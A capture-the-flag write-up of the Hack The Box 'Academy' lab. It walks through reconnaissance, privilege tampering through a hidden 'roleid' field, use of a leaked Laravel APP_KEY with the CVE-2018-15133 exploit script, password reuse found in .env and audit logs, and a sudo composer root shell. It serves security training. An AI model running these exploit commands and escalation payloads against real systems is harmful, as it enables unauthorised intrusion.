# Academy

Academy is a easy HTB lab that focuses on web vulnerability, information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV -sC 10.129.72.136
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-30 11:02 GMT
Nmap scan report for 10.129.72.136
Host is up (0.087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c090a3d835256ffa3306cf8013a0a553 (RSA)
|   256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA)
|_  256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.61 seconds
```

Checking the website:
```
$ curl -I 10.129.72.136
HTTP/1.1 302 Found
Date: Tue, 30 Jan 2024 11:03:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://academy.htb/
Content-Type: text/html; charset=UTF-8
```

Adding new domains found to `/etc/hosts`.
```
sudo tee --append /etc/hosts <<< "10.129.72.136 academy.htb"
```

Enumerating the files and folders on the website:
```
$ feroxbuster -u http://academy.htb/ -A -k -d 10 --filter-status 404 --smart --output web.txt -w /usr/share/wordlists/dirb/big.txt
200      GET      141l      226w     2627c http://academy.htb/login.php
200      GET      148l      247w     3003c http://academy.htb/register.php
200      GET       60l      123w     5261c http://academy.htb/images/logo.svg
200      GET       76l      131w     2117c http://academy.htb/
301      GET        9l       28w      311c http://academy.htb/images => http://academy.htb/images/
[####################] - 14s    40997/40997   0s      found:5       errors:0
[####################] - 12s    20482/20482   1644/s  http://academy.htb/
[####################] - 5s     20482/20482   3766/s  http://academy.htb/images/

$ feroxbuster -u http://academy.htb/ -A -k -d 10 --filter-status 404 --smart --output web.txt -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-files.txt
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       76l      131w     2117c http://academy.htb/
200      GET      141l      226w     2627c http://academy.htb/login.php
200      GET      148l      247w     3003c http://academy.htb/register.php
200      GET        0l        0w        0c http://academy.htb/config.php
200      GET       18l      188w     8276c http://academy.htb/images/logo.png
200      GET      141l      227w     2633c http://academy.htb/admin.php
200      GET       60l      123w     5261c http://academy.htb/images/logo.svg
200      GET       76l      131w     2117c http://academy.htb/index.php
200      GET      366l     2478w   164846c http://academy.htb/Modules_files/*
```

### Attack
We can see there are two login pages, assuming one `login.php` for user and another one `admin.php` for admin. There is also a `register.php` page to add new user.

```
POST /register.php HTTP/1.1
Host: academy.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

uid=test2&password=test&confirm=test&roleid=0
```

In this request, we can see a `roleid` which not there on the form. This paramater can be modified. Changed the roleId to 1 and it worked. Once the roleId was changed then we can login for that user on http://academy.htb/admin-page.php .

From the website after admin login, we geth following information:
* title - `Academy Launch Planner`
* `Fix issue with dev-staging-01.academy.htb`

Adding this new domain to list.
```
sudo tee --append /etc/hosts <<< "10.129.72.136 dev-staging-01.academy.htb"
```

Opening the website `dev-staging-01.academy.htb` shows us erros page. This page gives us following information:
* DOCUMENT_ROOT "/var/www/html/htb-academy-dev-01/public"
* SERVER_SOFTWARE "Apache/2.4.41 (Ubuntu)"
* APP_NAME "Laravel"
* APP_ENV "local"
* APP_KEY "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
* APP_DEBUG "true"
* DB_CONNECTION "mysql"
* DB_HOST "127.0.0.1"
* DB_PORT "3306"
* DB_DATABASE "homestead"
* DB_USERNAME "homestead"
* DB_PASSWORD "secret"

Since the app key is leaked, searching online will show us that this website running is Laravel which is vulnerable to `CVE-2018-15133` exploit.
```
git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133.git
cd exploit_laravel_cve-2018-15133
python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive

$ whoami
www-data
```

### User

Enumerating the machine:
```
$ ls /home
21y4d
ch4p
cry0l1t3
egre55
g0blin
mrb3n
```

Checking out the files and folder, we found somethig different in following `.env` file in `/var/www/html/academy/` folder.
```
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=my****************!!
```
Testing this password against all logins, we find that `cry0l1t3:my****************!!` works.

Getting the flag:
```
ssh cry0l1t3@academy.htb
my****************!!
$ cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Checking the id:
```
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
Looks like `cry0l1t3` is apart of `adm` so it should have access to logs.

Searching across all logs in `/var/log` folder using `grep -r pass .` but didn't find anything. We can try `aureport` tool to search through logs.
```
$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_*******!",<nl>
3. 08/12/20 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/20 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/20 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
...
10. 08/12/20 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/20 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/20 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/20 02:33:36 109 0 ? 1 sh "exit",<nl>
```

Got credentials - `mrb3n:mrb3n_*******!`

Relogin through ssh as `mrb3n` and then checking the `sudo -l` for the user:
```
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```
From `https://gtfobins.github.io/gtfobins/composer/`, we got the following an attack path. Executing following commands give us root access:
```
$ TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x
# id
uid=0(root) gid=0(root) groups=0(root)
```
Getting the flag:
```
# cat /root/root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
